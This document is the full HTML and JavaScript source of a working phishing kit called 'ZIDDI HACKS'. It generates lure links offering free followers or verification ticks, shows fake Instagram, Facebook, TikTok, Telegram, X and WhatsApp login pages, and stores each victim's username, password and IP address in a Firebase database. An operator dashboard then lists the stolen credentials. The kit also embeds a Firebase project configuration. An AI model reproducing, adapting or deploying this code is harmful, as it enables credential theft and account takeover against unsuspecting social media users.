<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="ðŸŽ Claim Free 1000 Followers Now!">
    <meta property="og:description" content="Exclusive 2026 Social Media Growth Panel. Get your reward instantly!">
    <meta property="og:image" content="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b572.png">

    <title>ZIDDI HACKS | Master Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Exo+2:wght@400;600&display=swap');
        :root { --primary: #22c55e; --bg: #020617; --card: #0f172a; --neon: 0 0 15px rgba(34, 197, 94, 0.4); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Exo 2', sans-serif; }
        body { background: var(--bg); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px; }

        /* Auth Screen */
        .auth-container { text-align: center; background: var(--card); padding: 40px; border-radius: 30px; border: 1px solid var(--primary); box-shadow: var(--neon); width: 100%; max-width: 400px; margin-top: 50px; }
        .google-btn { background: white; color: #000; padding: 12px 25px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 10px; margin: 20px auto; transition: 0.3s; }

        /* Dashboard */
        #adminUI { display: none; width: 100%; max-width: 900px; }
        .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: var(--neon); }
        
        .platform-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
        .p-btn { background: #1e293b; padding: 15px 5px; border-radius: 12px; text-align: center; cursor: pointer; font-size: 11px; border: 1px solid transparent; transition: 0.3s; }
        .p-btn.active { border-color: var(--primary); background: rgba(34, 197, 94, 0.1); box-shadow: var(--neon); }
        .p-btn i { font-size: 24px; display: block; margin-bottom: 5px; }

        .btn { width: 100%; padding: 15px; background: var(--primary); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; color: #000; margin-top: 20px; }
        
        #linkContainer { display: none; margin-top: 15px; background: #000; padding: 15px; border: 1px dashed var(--primary); border-radius: 10px; position: relative; }
        .copy-tag { position: absolute; right: 10px; top: 10px; background: var(--primary); color: #000; font-size: 10px; padding: 3px 8px; border-radius: 4px; cursor: pointer; font-weight: bold; }

        .table-wrap { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; min-width: 600px; }
        th { color: var(--primary); text-align: left; padding: 12px; font-size: 11px; border-bottom: 1px solid #334155; }
        td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
        
        /* Victim UI Fixed */
        #victimUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 99999; color: #000; justify-content: center; align-items: center; flex-direction: column; }
        .v-login-msg { margin-bottom: 20px; color: #333; font-weight: 600; font-size: 14px; }
    </style>
</head>
<body>

    <div id="authUI" class="auth-container">
        <h1 style="font-family:'Orbitron'; color:var(--primary);">ZIDDI HACKS</h1>
        <p style="font-size: 12px; opacity: 0.6; margin: 10px 0;">Private Database Access</p>
        <button class="google-btn" onclick="login()">
            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" width="20">
            Continue with Google
        </button>
    </div>

    <div id="adminUI">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h2 style="font-family:'Orbitron'; color:var(--primary); font-size: 18px;">DASHBOARD</h2>
            <button onclick="logout()" style="background:transparent; color:red; border:1px solid red; padding:5px 12px; border-radius:8px; cursor:pointer; font-size:12px;">Logout</button>
        </div>

        <div class="card">
            <h3 style="font-size:14px; font-family:'Orbitron';">GENERATE LINK</h3>
            <div class="platform-grid">
                <div class="p-btn active" onclick="setPlat('Instagram', this)"><i class="fab fa-instagram"></i>Insta</div>
                <div class="p-btn" onclick="setPlat('Facebook', this)"><i class="fab fa-facebook"></i>Facebk</div>
                <div class="p-btn" onclick="setPlat('TikTok', this)"><i class="fab fa-tiktok"></i>TikTok</div>
                <div class="p-btn" onclick="setPlat('Telegram', this)"><i class="fab fa-telegram"></i>Tele</div>
                <div class="p-btn" onclick="setPlat('Twitter', this)"><i class="fab fa-twitter"></i>X (Tw)</div>
                <div class="p-btn" onclick="setPlat('WhatsApp', this)"><i class="fab fa-whatsapp"></i>W-App</div>
            </div>
            <button class="btn" onclick="genLink()">GENERATE PRIVATE LINK</button>
            <div id="linkContainer">
                <span class="copy-tag" onclick="copyLink()">COPY</span>
                <p id="finalLink" style="font-size:10px; color:var(--primary); word-break:break-all; padding-right:50px;"></p>
            </div>
        </div>

        <div class="card">
            <h3 style="font-size:14px; font-family:'Orbitron';">DATABASE</h3>
            <div class="table-wrap">
                <table>
                    <thead><tr><th>Platform</th><th>User</th><th>Pass</th><th>IP/Time</th></tr></thead>
                    <tbody id="vBody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <div id="victimUI">
        <div style="width:90%; max-width:350px; text-align:center;">
            <img id="vLogo" src="" width="180" style="margin-bottom:15px; display:block; margin-left:auto; margin-right:auto;">
            <p class="v-login-msg">Login to Get Free 1000 Followers</p>
            <input type="text" id="vUser" placeholder="Username, Email or Phone" style="width:100%; padding:14px; margin-bottom:10px; border:1px solid #dbdbdb; border-radius:5px; outline:none;">
            <input type="password" id="vPass" placeholder="Password" style="width:100%; padding:14px; margin-bottom:10px; border:1px solid #dbdbdb; border-radius:5px; outline:none;">
            <button id="vBtn" onclick="captureData()" style="width:100%; padding:14px; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">Log In</button>
            <p style="margin-top:20px; color:#385185; font-size:14px; font-weight:500;">Forgot password?</p>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
            authDomain: "movie-1e6fc.firebaseapp.com",
            projectId: "movie-1e6fc",
            storageBucket: "movie-1e6fc.firebasestorage.app",
            messagingSenderId: "371616954594",
            appId: "1:371616954594:web:977d88ec7570df351246bb"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();
        const provider = new firebase.auth.GoogleAuthProvider();

        let currentUser = null;
        let currentPlat = "Instagram";
        const urlParams = new URLSearchParams(window.location.search);

        function login() { auth.signInWithPopup(provider); }
        function logout() { auth.signOut().then(() => location.reload()); }

        auth.onAuthStateChanged(user => {
            if(user && !urlParams.has('login')) {
                currentUser = user;
                document.getElementById('authUI').style.display = 'none';
                document.getElementById('adminUI').style.display = 'block';
                loadVictims();
            }
        });

        function setPlat(p, el) {
            currentPlat = p;
            document.querySelectorAll('.p-btn').forEach(b => b.classList.remove('active'));
            el.classList.add('active');
        }

        function genLink() {
            const masks = {
                'Instagram': 'Instagram-Free-1000-Followers-2026',
                'Facebook': 'Facebook-Free-Followers-Get-Now',
                'TikTok': 'TikTok-Viral-Free-Views-Panel',
                'Telegram': 'Telegram-Free-Members-Claim',
                'Twitter': 'Twitter-Blue-Tick-Verification',
                'WhatsApp': 'WhatsApp-Free-Blue-Tick-Activate'
            };
            const baseUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
            document.getElementById('finalLink').innerText = `${baseUrl}?login=${masks[currentPlat]}&ref=${currentUser.uid}`;
            document.getElementById('linkContainer').style.display = 'block';
        }

        function copyLink() {
            const text = document.getElementById('finalLink').innerText;
            const el = document.createElement('textarea');
            el.value = text; document.body.appendChild(el); el.select();
            document.execCommand('copy'); document.body.removeChild(el);
            alert("âœ… Link Copied!");
        }

        function loadVictims() {
            db.collection('vault').where('ownerUID', '==', currentUser.uid).orderBy('time', 'desc').onSnapshot(snap => {
                const body = document.getElementById('vBody');
                body.innerHTML = "";
                snap.forEach(doc => {
                    const d = doc.data();
                    body.innerHTML += `<tr>
                        <td style="color:var(--primary); font-weight:bold;">${d.platform.split('-')[0]}</td>
                        <td>${d.user} <i class="fas fa-copy" style="cursor:pointer; margin-left:5px;" onclick="copyVal('${d.user}')"></i></td>
                        <td><code>${d.pass}</code> <i class="fas fa-copy" style="cursor:pointer; margin-left:5px;" onclick="copyVal('${d.pass}')"></i></td>
                        <td style="font-size:10px; opacity:0.6;">${d.ip}<br>${d.time}</td>
                    </tr>`;
                });
            });
        }

        function copyVal(v) {
            const el = document.createElement('textarea');
            el.value = v; document.body.appendChild(el); el.select();
            document.execCommand('copy'); document.body.removeChild(el);
            alert("Copied!");
        }

        // --- VICTIM LOGIC WITH FIXED LOGOS ---
        if(urlParams.has('login')) {
            document.getElementById('authUI').style.display = 'none';
            document.getElementById('adminUI').style.display = 'none';
            document.getElementById('victimUI').style.display = 'flex';
            
            const type = urlParams.get('login');
            const logo = document.getElementById('vLogo');
            const btn = document.getElementById('vBtn');
            
            // Fixed High-Quality CDN Logos
            if(type.includes('Facebook')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"; btn.style.background="#1877f2"; }
            else if(type.includes('TikTok')) { logo.src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"; btn.style.background="#000"; }
            else if(type.includes('Telegram')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"; btn.style.background="#0088cc"; }
            else if(type.includes('Twitter')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/5/53/X_logo_2023_original.svg"; btn.style.background="#000"; }
            else if(type.includes('WhatsApp')) { logo.src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"; btn.style.background="#25d366"; }
            else { logo.src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg"; btn.style.background="#d62976"; }
        }

        async function captureData() {
            const u = document.getElementById('vUser').value;
            const p = document.getElementById('vPass').value;
            if(!u || !p) return alert("Please fill all fields");
            let ip = "0.0.0.0";
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
            await db.collection('vault').add({
                platform: urlParams.get('login'),
                user: u, pass: p, ip: ip,
                ownerUID: urlParams.get('ref'),
                time: new Date().toLocaleString()
            });
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
